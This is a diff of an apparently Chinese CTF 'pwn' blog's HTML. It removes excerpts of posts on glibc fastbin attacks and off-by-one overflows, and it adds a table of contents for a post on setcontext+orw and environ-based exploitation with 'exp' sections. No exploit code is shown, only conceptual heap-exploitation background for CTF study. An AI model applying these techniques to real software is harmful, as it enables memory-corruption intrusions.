-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="A2ur2的梦想小屋">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/04/11/fastbin%20attacked/" class="post-title-link" itemprop="url">fastbin attacked</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-04-11 00:00:00" itemprop="dateCreated datePublished" datetime="2022-04-11T00:00:00+08:00">2022-04-11</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-04-22 21:58:33" itemprop="dateModified" datetime="2022-04-22T21:58:33+08:00">2022-04-22</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="fastbin-attacked"><a href="#fastbin-attacked" class="headerlink" title="fastbin attacked"></a>fastbin attacked</h1><h2 id="一、什么是fastbin"><a href="#一、什么是fastbin" class="headerlink" title="一、什么是fastbin"></a>一、什么是fastbin</h2><p>在glibc的堆块管理中，为了加快堆块分配的效率，会使用bins来管理分配了之后又释放的空闲堆块，当用户分配内存时，系统会先从bins里面寻找是否有合适大小的堆块，如果没有再考虑另外的分配方式（如top chunk切割等）。fastbin就是这样的一个bins，当大小在0x20~0x80的堆块被释放后就会进入fastbin。fastbin使用的是单链表链接的方式保存堆块，而且单条链表中的chunk大小是一致的。</p>
-<p>在主线程中会存在一个名为fastbinY的全局变量数组，大小为7，用于存放fastbin单个链表的头指针</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/04/11/fastbin%20attacked/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://a2ur2.github.io/2022/03/17/2022-03-17-off-by-one/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="A2ur2">
-      <meta itemprop="description" content="在成为大赛pwn题签到员的路上">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="A2ur2的梦想小屋">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/03/17/2022-03-17-off-by-one/" class="post-title-link" itemprop="url">off by one</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-03-17 15:47:10" itemprop="dateCreated datePublished" datetime="2022-03-17T15:47:10+08:00">2022-03-17</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-04-22 21:56:39" itemprop="dateModified" datetime="2022-04-22T21:56:39+08:00">2022-04-22</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="一、off-by-one漏洞利用的前置知识点"><a href="#一、off-by-one漏洞利用的前置知识点" class="headerlink" title="一、off by one漏洞利用的前置知识点"></a>一、off by one漏洞利用的前置知识点</h2><h3 id="1-什么是off-by-one"><a href="#1-什么是off-by-one" class="headerlink" title="1.什么是off by one"></a>1.什么是off by one</h3><p>off by one是指在输入的时候没有严格控制输入的数据大小，导致溢出了一个字节长度的数据。通常来说循环写入数据时没有控制循环次数（例如在循环结束时补充了‘\x00’，但是循环的次数却是缓冲区的大小），字符串处理不当（例如组合利用strlen和strcpy）</p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2022/03/17/2022-03-17-off-by-one/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://a2ur2.github.io/2022/03/10/%E4%B8%80%E4%BA%9B%E7%A2%8E%E7%A2%8E%E5%BF%B5/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="A2ur2">
-      <meta itemprop="description" content="在成为大赛pwn题签到员的路上">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="A2ur2的梦想小屋">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/03/10/%E4%B8%80%E4%BA%9B%E7%A2%8E%E7%A2%8E%E5%BF%B5/" class="post-title-link" itemprop="url">前言</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-03-10 19:12:37" itemprop="dateCreated datePublished" datetime="2022-03-10T19:12:37+08:00">2022-03-10</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-03-15 22:22:25" itemprop="dateModified" datetime="2022-03-15T22:22:25+08:00">2022-03-15</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><strong>关于这个博客</strong></p>
-<div style="text-indent:2em;">
-一开始我并没有搭建博客的想法，但随着pwn的学习我发现，我需要一个地方去记录一下我的学习经历以及学习的内容，以便我加深对已经学习内容的理解。  
-
-<p>于是我耗时一天左右的时间搭建起了这个博客，希望它能见证我的成长，并且能够伴我一起圆梦。</p>
-</div>
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
   
 
 
@@ -805,6 +335,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81setcontext-orw%EF%BC%88libc-lt-2-29%EF%BC%89"><span class="nav-number">1.</span> <span class="nav-text">一、setcontext+orw（libc&lt;2.29）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81setcontext"><span class="nav-number">1.1.</span> <span class="nav-text">1、setcontext</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="nav-number">1.2.</span> <span class="nav-text">2、解题思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3%E3%80%81exp"><span class="nav-number">1.3.</span> <span class="nav-text">3、exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81setcontext-orw%EF%BC%88libc-gt-2-29%EF%BC%89"><span class="nav-number">2.</span> <span class="nav-text">二、setcontext+orw（libc&gt;2.29）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81%E6%94%B9%E5%8A%A8%E4%BB%A5%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95"><span class="nav-number">2.1.</span> <span class="nav-text">1、改动以及解决方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81exp"><span class="nav-number">2.2.</span> <span class="nav-text">2、exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81%E5%88%A9%E7%94%A8environ"><span class="nav-number">3.</span> <span class="nav-text">三、利用environ</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81environ%E5%8F%98%E9%87%8F"><span class="nav-number">3.1.</span> <span class="nav-text">1、environ变量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E8%B0%83%E8%AF%95%E5%B0%8Ftips"><span class="nav-number">3.2.</span> <span class="nav-text">2、调试小tips</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3%E3%80%81exp-1"><span class="nav-number">3.3.</span> <span class="nav-text">3、exp</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
